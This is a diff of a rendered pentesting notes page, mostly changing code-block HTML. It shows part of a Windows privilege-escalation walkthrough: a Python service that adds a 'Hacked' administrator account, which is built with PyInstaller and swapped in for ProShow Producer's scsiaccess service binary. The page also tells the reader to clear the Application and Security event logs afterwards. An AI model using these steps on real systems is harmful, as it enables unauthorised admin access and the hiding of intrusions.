+</span><span id="__span-4-55"><a id="__codelineno-4-55" name="__codelineno-4-55"></a>            <span class="p">)</span>
+</span><span id="__span-4-56"><a id="__codelineno-4-56" name="__codelineno-4-56"></a>        <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-4-57"><a id="__codelineno-4-57" name="__codelineno-4-57"></a>            <span class="n">win32net</span><span class="o">.</span><span class="n">NetUserAdd</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">user_info</span><span class="p">)</span>
+</span><span id="__span-4-58"><a id="__codelineno-4-58" name="__codelineno-4-58"></a>            <span class="n">win32net</span><span class="o">.</span><span class="n">NetLocalGroupAddMembers</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">GROUP</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="p">[</span><span class="n">user_group_info</span><span class="p">])</span>
+</span><span id="__span-4-59"><a id="__codelineno-4-59" name="__codelineno-4-59"></a>        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span>
+</span><span id="__span-4-60"><a id="__codelineno-4-60" name="__codelineno-4-60"></a>            <span class="k">pass</span>
+</span><span id="__span-4-61"><a id="__codelineno-4-61" name="__codelineno-4-61"></a><span class="w">        </span><span class="sd">&#39;&#39;&#39; </span>
+</span><span id="__span-4-62"><a id="__codelineno-4-62" name="__codelineno-4-62"></a><span class="sd">        f = open(&#39;C:/Users/nonadmin/Desktop/priv.txt&#39;, &#39;w&#39;)</span>
+</span><span id="__span-4-63"><a id="__codelineno-4-63" name="__codelineno-4-63"></a><span class="sd">        if ctypes.windll.shell32.IsUserAnAdmin() == 0:</span>
+</span><span id="__span-4-64"><a id="__codelineno-4-64" name="__codelineno-4-64"></a><span class="sd">            f.write(&#39;[-] We are NOT admin&#39;)</span>
+</span><span id="__span-4-65"><a id="__codelineno-4-65" name="__codelineno-4-65"></a><span class="sd">        else:</span>
+</span><span id="__span-4-66"><a id="__codelineno-4-66" name="__codelineno-4-66"></a><span class="sd">            f.write(&#39;[+] We are admin&#39;)</span>
+</span><span id="__span-4-67"><a id="__codelineno-4-67" name="__codelineno-4-67"></a><span class="sd">        f.close()</span>
+</span><span id="__span-4-68"><a id="__codelineno-4-68" name="__codelineno-4-68"></a><span class="sd">        &#39;&#39;&#39;</span>
+</span><span id="__span-4-69"><a id="__codelineno-4-69" name="__codelineno-4-69"></a>    <span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-4-70"><a id="__codelineno-4-70" name="__codelineno-4-70"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">runflag</span><span class="o">=</span><span class="kc">False</span>
+</span><span id="__span-4-71"><a id="__codelineno-4-71" name="__codelineno-4-71"></a>
+</span><span id="__span-4-72"><a id="__codelineno-4-72" name="__codelineno-4-72"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span><span id="__span-4-73"><a id="__codelineno-4-73" name="__codelineno-4-73"></a>
+</span><span id="__span-4-74"><a id="__codelineno-4-74" name="__codelineno-4-74"></a>
+</span><span id="__span-4-75"><a id="__codelineno-4-75" name="__codelineno-4-75"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">Initialize</span><span class="p">()</span>
+</span><span id="__span-4-76"><a id="__codelineno-4-76" name="__codelineno-4-76"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">PrepareToHostSingle</span><span class="p">(</span><span class="n">Service</span><span class="p">)</span>
+</span><span id="__span-4-77"><a id="__codelineno-4-77" name="__codelineno-4-77"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">StartServiceCtrlDispatcher</span><span class="p">()</span>
+</span><span id="__span-4-78"><a id="__codelineno-4-78" name="__codelineno-4-78"></a>    <span class="n">win32serviceutil</span><span class="o">.</span><span class="n">HandleCommandLine</span><span class="p">(</span><span class="n">Service</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
 <p>To export into EXE use:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Pyinstaller --onfile Create_New_Admin_account.py`
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>Pyinstaller --onfile Create_New_Admin_account.py`
+</span></code></pre></div></td></tr></table></div>
 <p><strong>9.</strong> Replace the service file, under</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>C:\Program Files (x86)\Photodex\ProShow Producer`
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>C:\Program Files (x86)\Photodex\ProShow Producer`
+</span></code></pre></div></td></tr></table></div>
 <p><strong>10.</strong> Rename the original scsiaccess to scsiaccess123.</p>
 <p><strong>11.</strong> Put your Python exe as scsiaccess  (without .exe).</p>
 <p><strong>12.</strong> Restart and test- You should see "Hacked" account been created.</p>
 <h3 id="python-script-to-check-if-we-are-admin-users-on-windows">Python script to check if we are admin users on Windows</h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">import</span> <span class="nn">ctypes</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>    <span class="k">if</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">shell32</span><span class="o">.</span><span class="n">IsUserAnAdmin</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>        <span class="nb">print</span> <span class="s1">&#39;[-] We are NOT admin! &#39;</span>
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>    <span class="k">else</span><span class="p">:</span>
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>        <span class="nb">print</span> <span class="s1">&#39;[+] We are admin :) &#39;</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span>
+<span class="normal"><a href="#__codelineno-7-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="kn">import</span> <span class="nn">ctypes</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>    <span class="k">if</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">shell32</span><span class="o">.</span><span class="n">IsUserAnAdmin</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a>        <span class="nb">print</span> <span class="s1">&#39;[-] We are NOT admin! &#39;</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a>        <span class="nb">print</span> <span class="s1">&#39;[+] We are admin :) &#39;</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="erasing-tracks">Erasing tracks</h2>
 <p>Once you are admin, open Event Viewer and go to Windows Logs. Click right button on Applications and Security and the option "Clear Logs".</p>
 
@@ -17347,7 +17511,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
